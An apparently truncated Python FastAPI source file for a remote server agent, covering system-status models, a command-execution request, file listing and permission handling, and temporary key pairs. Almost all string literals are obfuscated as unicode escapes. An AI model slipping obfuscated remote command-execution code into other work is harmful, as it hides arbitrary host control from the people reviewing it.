import codecs
import os
import sys
import json
import time
import base64
import hashlib
import hmac
import secrets
import threading
from datetime import datetime, timezone
from typing import Union, List, Dict, Any, Optional
from fastapi import FastAPI, Request, Response, HTTPException, status
from fastapi.responses import JSONResponse
from starlette.middleware.base import BaseHTTPMiddleware
from urllib.parse import unquote, urlsplit
from ecdsa import SigningKey, VerifyingKey, BadSignatureError, NIST256p
from ecdsa.util import sigdecode_der, sigdecode_string
import binascii
try:
    from ecies import encrypt as ecies_encrypt
except Exception:
    import hmac as _hmac_mod
    _SECP_P = 115792089237316195423570985008687907853269984665640564039457584007908834671663
    _SECP_N = 115792089237316195423570985008687907852837564279074904382605163141518161494337

    def _secp_decompress_pub(O0_var_1: bytes):
        from ecdsa import SECP256k1, VerifyingKey
        from ecdsa.ellipticcurve import Point
        if len(O0_var_1) == 65 and O0_var_1[0] == 4:
            return VerifyingKey.from_string(O0_var_1[1:], curve=SECP256k1).pubkey.point
        if len(O0_var_1) == 33 and O0_var_1[0] in (2, 3):
            O0_var_2 = int.from_bytes(O0_var_1[1:], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            O0_var_3 = (pow(O0_var_2, 3, _SECP_P) + 7) % _SECP_P
            O0_var_4 = pow(O0_var_3, (_SECP_P + 1) // 4, _SECP_P)
            if O0_var_4 * O0_var_4 % _SECP_P != O0_var_3:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079', 'unicode_escape'))
            if O0_var_4 & 1 != O0_var_1[0] - 2:
                O0_var_4 = _SECP_P - O0_var_4
            return Point(SECP256k1.curve, O0_var_2, O0_var_4)
        raise ValueError(codecs.decode('\\u0075\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074', 'unicode_escape'))

    def _secp_point_bytes(O0_var_5) -> bytes:
        return b'\x04' + O0_var_5.x().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_5.y().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))

    def _kisama_hkdf_sha256(O0_var_6: bytes, O0_var_7: int=32) -> bytes:
        O0_var_8 = _hmac_mod.new(b'', O0_var_6, hashlib.sha256).digest()
        O0_var_9 = b''
        O0_var_10 = b''
        O0_var_11 = 1
        while len(O0_var_9) < O0_var_7:
            O0_var_10 = _hmac_mod.new(O0_var_8, O0_var_10 + bytes([O0_var_11]), hashlib.sha256).digest()
            O0_var_9 += O0_var_10
            O0_var_11 += 1
        return O0_var_9[:O0_var_7]

    def _kisama_ecies_encrypt_fallback(O0_var_12: bytes, data: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_13 = _secp_decompress_pub(O0_var_12)
        while True:
            O0_var_14 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < _SECP_N:
                break
        O0_var_15 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_14, curve=SECP256k1).get_verifying_key().to_string()
        O0_var_16 = _secp_point_bytes(O0_var_13 * int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')))
        O0_var_17 = _kisama_hkdf_sha256(O0_var_15 + O0_var_16)
        O0_var_18 = secrets.token_bytes(16)
        O0_var_19 = AESGCM(O0_var_17).encrypt(O0_var_18, data, None)
        return O0_var_15 + O0_var_18 + O0_var_19[-16:] + O0_var_19[:-16]
    ecies_encrypt = _kisama_ecies_encrypt_fallback
import uvicorn
import asyncio
import platform
import psutil
import aiohttp
import socket
import subprocess
import shlex
from fastapi import BackgroundTasks
from croniter import croniter
from collections import deque
from contextlib import asynccontextmanager
from pydantic import BaseModel, Field, RootModel, ConfigDict
from fastapi import Body, Depends, Query
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except Exception:

    def _kisama_get_random_bytes(O0_var_20: int) -> bytes:
        return os.urandom(O0_var_20)

    class _KisamaAESGCMFallback:

        def __init__(self, key: bytes, nonce: bytes):
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self._aesgcm = AESGCM(key)
            self._nonce = nonce

        def encrypt_and_digest(self, O0_var_21: bytes):
            O0_var_22 = self._aesgcm.encrypt(self._nonce, O0_var_21, None)
            return (O0_var_22[:-16], O0_var_22[-16:])

        def decrypt_and_verify(self, O0_var_23: bytes, O0_var_24: bytes) -> bytes:
            return self._aesgcm.decrypt(self._nonce, O0_var_23 + O0_var_24, None)

    class _KisamaAESFallback:
        MODE_GCM = codecs.decode('\\u0067\\u0063\\u006d', 'unicode_escape')

        @staticmethod
        def new(key: bytes, mode, nonce: bytes=None):
            if nonce is None:
                raise ValueError(codecs.decode('\\u517c\\u5bb9\\u57ab\\u7247\\u4ec5\\u652f\\u6301\\u0020\\u0041\\u0045\\u0053\\u002d\\u0047\\u0043\\u004d\\u0020\\u4e14\\u5fc5\\u987b\\u63d0\\u4f9b\\u0020\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
            return _KisamaAESGCMFallback(key, nonce)
    AES = _KisamaAESFallback
    get_random_bytes = _kisama_get_random_bytes
from noise.connection import NoiseConnection, Keypair
from fastapi import WebSocket, WebSocketDisconnect
import shutil
import struct
import select
import signal
if os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape'):
    termios = None
    fcntl = None
    pty = None
else:
    import termios
    import fcntl
    import pty
import http.client
import queue
import ssl
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, asdict
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives import serialization
from typing import Tuple

def _load_dotenv():
    try:
        O0_var_25 = os.path.join(os.path.dirname(os.path.abspath(__file__)), codecs.decode('\\u002e\\u0065\\u006e\\u0076', 'unicode_escape'))
        if not os.path.isfile(O0_var_25):
            return
        with open(O0_var_25, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_26:
            for O0_var_27 in O0_var_26:
                O0_var_28 = O0_var_27.strip()
                if not O0_var_28 or O0_var_28.startswith(codecs.decode('\\u0023', 'unicode_escape')):
                    continue
                if O0_var_28.startswith(codecs.decode('\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020', 'unicode_escape')):
                    O0_var_28 = O0_var_28[len(codecs.decode('\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020', 'unicode_escape')):].lstrip()
                if codecs.decode('\\u003d', 'unicode_escape') not in O0_var_28:
                    continue
                O0_var_29, O0_var_30, O0_var_31 = O0_var_28.partition(codecs.decode('\\u003d', 'unicode_escape'))
                O0_var_29 = O0_var_29.strip()
                O0_var_31 = O0_var_31.strip()
                if len(O0_var_31) >= 2 and O0_var_31[0] == O0_var_31[-1] and (O0_var_31[0] in (codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('\\u0027', 'unicode_escape'))):
                    O0_var_31 = O0_var_31[1:-1]
                if O0_var_29:
                    os.environ.setdefault(O0_var_29, O0_var_31)
    except Exception:
        pass
_load_dotenv()

def _resolve_safe_cwd():
    for O0_var_32 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_32 and os.path.isdir(O0_var_32):
            return O0_var_32
    return codecs.decode('\\u002e', 'unicode_escape')

def _resolve_safe_file_root():
    for O0_var_33 in (os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_33 and os.path.isdir(O0_var_33):
            return O0_var_33
        if O0_var_33:
            print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5019\\u9009\\u76ee\\u5f55\\u4e0d\\u5b58\\u5728\\u002c\\u0020\\u5df2\\u8df3\\u8fc7\\u003a\\u0020', 'unicode_escape') + str(O0_var_33))
    print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5168\\u90e8\\u5019\\u9009\\u65e0\\u6548\\u002c\\u0020\\u964d\\u7ea7\\u5230\\u5f53\\u524d\\u5de5\\u4f5c\\u76ee\\u5f55\\u003a\\u0020', 'unicode_escape') + str(os.getcwd()))
    return os.getcwd()

class SResponse(BaseModel):
    codecs.decode('\\u901a\\u7528\\u72b6\\u6001\\u54cd\\u5e94', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')])

class CountResponse(SResponse):
    codecs.decode('\\u5e26\\u8ba1\\u6570\\u7684\\u901a\\u7528\\u54cd\\u5e94', 'unicode_escape')
    count: int = Field(..., examples=[0])

class BaseInfoResponse(BaseModel):
    codecs.decode('\\u4ee3\\u7406\\u57fa\\u7840\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    arch: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u67b6\\u6784', 'unicode_escape'), examples=[codecs.decode('\\u0078\\u0038\\u0036\\u005f\\u0036\\u0034', 'unicode_escape')])
    cpu_cores: int = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u6838\\u5fc3\\u6570', 'unicode_escape'), examples=[4])
    cpu_name: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u0049\\u006e\\u0074\\u0065\\u006c\\u0028\\u0052\\u0029\\u0020\\u0058\\u0065\\u006f\\u006e\\u0028\\u0052\\u0029\\u0020\\u0043\\u0050\\u0055\\u0020\\u0040\\u0020\\u0032\\u002e\\u0032\\u0030\\u0047\\u0048\\u007a', 'unicode_escape')])
    disk_total: int = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u603b\\u5bb9\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[48360738816])
    gpu_name: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u0047\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u0056\\u0049\\u0044\\u0049\\u0041\\u0020\\u0047\\u0065\\u0046\\u006f\\u0072\\u0063\\u0065\\u0020\\u0052\\u0054\\u0058\\u0020\\u0033\\u0030\\u0039\\u0030', 'unicode_escape')])
    ipv4: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0034\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0031\\u0039\\u0032\\u002e\\u0031\\u0036\\u0038\\u002e\\u0031\\u002e\\u0031\\u0030\\u0030', 'unicode_escape')])
    ipv6: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0036\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0030\\u0031\\u003a\\u0064\\u0062\\u0038\\u003a\\u003a\\u0031', 'unicode_escape')])
    mem_total: int = Field(..., description=codecs.decode('\\u5185\\u5b58\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[8589934592])
    os: str = Field(..., description=codecs.decode('\\u64cd\\u4f5c\\u7cfb\\u7edf\\u540d\\u79f0', 'unicode_escape'), examples=[codecs.decode('\\u0055\\u0062\\u0075\\u006e\\u0074\\u0075\\u0020\\u0032\\u0032\\u002e\\u0030\\u0034', 'unicode_escape')])
    kernel_version: str = Field(..., description=codecs.decode('\\u5185\\u6838\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0035\\u002e\\u0031\\u0035\\u002e\\u0030\\u002d\\u0037\\u0036\\u002d\\u0067\\u0065\\u006e\\u0065\\u0072\\u0069\\u0063', 'unicode_escape')])
    swap_total: int = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[0])
    version: str = Field(..., description=codecs.decode('\\u4ee3\\u7406\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0031', 'unicode_escape')])
    virtualization: str = Field(..., description=codecs.decode('\\u865a\\u62df\\u5316\\u73af\\u5883', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')])
    session_key: Optional[bytes] = Field(None, description=codecs.decode('\\u672c\\u6b21\\u4f1a\\u8bdd\\u7684\\u52a8\\u6001\\u0020\\u0041\\u0045\\u0053\\u002d\\u0032\\u0035\\u0036\\u0020\\u5bc6\\u94a5\\u0020\\u0028\\u660e\\u6587\\uff0c\\u7531\\u4e2d\\u95f4\\u4ef6\\u8d1f\\u8d23\\u52a0\\u5bc6\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006b\\u0037\\u0042\\u0076\\u0039\\u002e\\u002e\\u002e\\u0033\\u0032\\u4f4d\\u5bc6\\u94a5\\u5b57\\u7b26\\u4e32\\u6216\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')])
    noise_key: Optional[Dict[str, Any]] = Field(None, description=codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u5bc6\\u94a5\\u914d\\u7f6e\\uff0c\\u63a5\\u6536\\u4efb\\u610f\\u5b57\\u5178\\u7ed3\\u6784', 'unicode_escape'))

class StatusResponse(BaseModel):
    codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    cpu: Dict[str, float] = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): 12.5}])
    ram: Dict[str, int] = Field(..., description=codecs.decode('\\u5185\\u5b58\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 8589934592, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 4000000000}])
    swap: Dict[str, int] = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}])
    load: Dict[str, float] = Field(..., description=codecs.decode('\\u7cfb\\u7edf\\u8d1f\\u8f7d', 'unicode_escape'), examples=[{codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): 0.5, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): 0.4, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): 0.3}])
    disk: Dict[str, int] = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 48360738816, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 30000000000}])
    network: Dict[str, int] = Field(..., description=codecs.decode('\\u7f51\\u7edc\\u7edf\\u8ba1', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0070', 'unicode_escape'): 1024, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 2048, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): 1000000, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): 2000000}])
    connections: Dict[str, int] = Field(..., description=codecs.decode('\\u8fde\\u63a5\\u6570', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): 20, codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): 5}])
    uptime: int = Field(..., description=codecs.decode('\\u8fd0\\u884c\\u65f6\\u95f4\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[3600])
    process: int = Field(..., description=codecs.decode('\\u8fdb\\u7a0b\\u6570\\u91cf', 'unicode_escape'), examples=[150])
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u9644\\u52a0\\u6d88\\u606f', 'unicode_escape'), examples=[codecs.decode('', 'unicode_escape')])

class ExecResponse(BaseModel):
    result: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u0028\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074\\u002b\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0020\\u0034\\u000a\\u0064\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u002e\\u002e\\u002e', 'unicode_escape')])
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801\\u0020\\u0028\\u0030\\u003d\\u6210\\u529f\\u002c\\u0020\\u0031\\u0032\\u0034\\u003d\\u8d85\\u65f6\\u002c\\u0020\\u0031\\u0032\\u0037\\u003d\\u672a\\u627e\\u5230\\u0029', 'unicode_escape'), examples=[0])
    timeout: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u56e0\\u8d85\\u65f6\\u88ab\\u7ec8\\u6b62', 'unicode_escape'), examples=[False])
    cmd: str = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape')])

class TempKeyEcdsaPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0050\\u0045\\u004d\\u003b\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003d\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u65f6\\u79c1\\u94a5\\u4e3a\\u0020\\u0036\\u0034\\u4f4d\\u0068\\u0065\\u0078\\u0020\\u6807\\u91cf\\u3001\\u516c\\u94a5\\u4e3a\\u0020\\u0033\\u0033\\u5b57\\u8282\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u002c\\u0020\\u0030\\u002e\\u0035\\u002e\\u0038\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0050\\u0045\\u004d\\u0020\\u002f\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u683c\\u5f0f\\u0020\\u0036\\u0034\\u4f4d\\u0068\\u0065\\u0078\\u002c\\u0020\\u7528\\u4e8e\\u7b7e\\u540d\\u8bf7\\u6c42\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u516c\\u94a5\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0050\\u0045\\u004d\\u0020\\u002f\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u683c\\u5f0f\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyEciesPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u5341\\u516d\\u8fdb\\u5236\\u683c\\u5f0f\\u003b\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003d\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u65f6\\u4ec5\\u516c\\u94a5\\u6362\\u4e3a\\u0020\\u0033\\u0033\\u5b57\\u8282\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u0068\\u0065\\u0078\\u002c\\u0020\\u0036\\u0034\\u5b57\\u7b26\\u003d\\u0033\\u0032\\u5b57\\u8282\\u002c\\u0020\\u7528\\u4e8e\\u89e3\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0061\\u0065\\u0036\\u0038\\u0064\\u0030\\u0065\\u0063\\u0038\\u0033\\u0065\\u0037\\u0065\\u0061\\u0030\\u0064\\u0034\\u0037\\u0034\\u0033\\u0034\\u0061\\u0035\\u0039\\u0063\\u0034\\u0032\\u0036\\u0035\\u0036\\u0064\\u0033\\u0030\\u0065\\u0036\\u0065\\u0062\\u0065\\u0031\\u0063\\u0039\\u0032\\u0039\\u0037\\u0036\\u0062\\u0035\\u0037\\u0031\\u0038\\u0035\\u0039\\u0063\\u0038\\u0066\\u0063\\u0062\\u0064\\u0064\\u0030\\u0034\\u0038\\u0037\\u0030', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u516c\\u94a5\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0068\\u0065\\u0078\\u0020\\u0031\\u0033\\u0030\\u5b57\\u7b26\\u0020\\u002f\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u683c\\u5f0f\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u002c\\u0020\\u4f9b\\u4ee3\\u7406\\u7aef\\u52a0\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u0034\\u0062\\u0063\\u0066\\u0037\\u0031\\u0063\\u0036\\u0037\\u0062\\u0039\\u0066\\u0033\\u0036\\u0037\\u0032\\u0035\\u0066\\u0035\\u0034\\u0063\\u0034\\u0031\\u0066\\u0039\\u0036\\u0035\\u0032\\u0061\\u0063\\u0066\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyResponse(BaseModel):
    codecs.decode('\\u83b7\\u53d6\\u4e34\\u65f6\\u5bc6\\u94a5\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    key_id: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u5bc6\\u94a5\\u6807\\u8bc6', 'unicode_escape'), examples=[codecs.decode('\\u0033\\u0066\\u0039\\u0061\\u0030\\u0062\\u0032\\u0063\\u0034\\u0064\\u0035\\u0065\\u0036\\u0066\\u0037\\u0038', 'unicode_escape')])
    ttl_seconds: int = Field(..., description=codecs.decode('\\u6709\\u6548\\u671f\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[86400])
    created_at: str = Field(..., description=codecs.decode('\\u751f\\u6210\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    expires_at: str = Field(..., description=codecs.decode('\\u8fc7\\u671f\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0039\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    ecdsa: TempKeyEcdsaPair
    ecies: TempKeyEciesPair

class ExecRequestJSON(BaseModel):
    cmd: str = Field(..., description=codecs.decode('\\u8981\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002d\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')])
    cwd: Optional[str] = Field(None, description=codecs.decode('\\u5de5\\u4f5c\\u76ee\\u5f55', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    env: Optional[Dict[str, str]] = Field(None, description=codecs.decode('\\u989d\\u5916\\u73af\\u5883\\u53d8\\u91cf', 'unicode_escape'), examples=[{codecs.decode('\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'): codecs.decode('\\u002f\\u0075\\u0073\\u0072\\u002f\\u0062\\u0069\\u006e', 'unicode_escape'), codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'): codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')}])

class FileListRequest(BaseModel):
    path: str = Field(codecs.decode('\\u002e', 'unicode_escape'), description=codecs.decode('\\u8981\\u5217\\u51fa\\u7684\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5217\\u51fa\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class FileInfo(BaseModel):
    name: str
    path: str
    type: str
    size: int
    mtime: str
    mode: str
    mode_octal: str
    owner: str

class FileListResponse(CountResponse):
    files: List[FileInfo]

class AuthorityQueryRequest(BaseModel):
    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u67e5\\u8be2\\u6743\\u9650\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')]])

class AuthorityInfo(BaseModel):
    path: str
    name: str
    mode: str
    mode_octal: str
    type: str
    readable: bool
    writable: bool
    executable: bool

class AuthorityQueryResponse(SResponse):
    files: List[AuthorityInfo]

class AuthoritySetRequest(BaseModel):
